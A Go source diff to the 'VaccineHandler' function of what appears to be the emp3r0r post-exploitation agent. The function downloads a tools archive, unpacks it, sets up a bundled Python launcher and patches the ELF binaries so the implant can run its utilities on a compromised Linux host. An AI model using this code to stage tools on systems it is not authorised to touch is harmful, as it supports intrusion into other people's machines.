@@ -1,3 +1,6 @@
+//go:build linux
+// +build linux
+
 package agent
 
 /*
@@ -28,9 +31,9 @@ func VaccineHandler() (out string) {
 		// run python scripts with this command
 		// LD_LIBRARY_PATH=$LD_LIBRARY_PATH:/home/u/alpine/lib PYTHONPATH="/tmp/python3.9:/tmp/python3.9/site-packages:/tmp/python3.9/lib-dynload" /tmp/python3
 		PythonCmd = fmt.Sprintf("PYTHONPATH=%s PYTHONHOME=%s "+
-			"LD_LIBRARY_PATH=%s:/usr/lib:/lib:/lib64:/usr/lib64:/usr/lib32 %s ",
+			"LD_LIBRARY_PATH=%s/lib %s ",
 			PythonPath, PythonLib,
-			emp3r0r_data.LibPath, RuntimeConfig.UtilsPath+"/python3")
+			RuntimeConfig.UtilsPath, RuntimeConfig.UtilsPath+"/python3")
 
 		// run python itself with this script
 		PythonLauncher = fmt.Sprintf("#!%s\n%s"+`"$@"`+"\n", emp3r0r_data.DefaultShell, PythonCmd)
@@ -44,6 +47,7 @@ func VaccineHandler() (out string) {
 		out = "[-] Download error: " + err.Error()
 		return
 	}
+	defer os.Remove(RuntimeConfig.AgentRoot + "/utils.tar.bz2")
 
 	// unpack utils.tar.bz2 to our PATH
 	os.RemoveAll(RuntimeConfig.UtilsPath) // archiver fucking aborts when files already exist
@@ -66,7 +70,23 @@ func VaccineHandler() (out string) {
 		out = fmt.Sprintf("Write python launcher: %v", err)
 	}
 	log.Println("Python configured")
-	os.Remove(RuntimeConfig.AgentRoot + "/utils.tar.bz2")
+
+	// fix ELFs
+	files, err := os.ReadDir(RuntimeConfig.UtilsPath)
+	if err != nil {
+		return fmt.Sprintf("Fix ELFs: %v", err)
+	}
+	for _, f := range files {
+		fpath := fmt.Sprintf("%s/%s", RuntimeConfig.UtilsPath, f.Name())
+		if !IsELF(fpath) || f.Name() == "patchelf" {
+			continue
+		}
+		err = FixELF(fpath)
+		if err != nil {
+			out = fmt.Sprintf("%s, %s: %v", out, fpath, err)
+		}
+	}
+	log.Println("ELFs configured")
 
 	return
 }
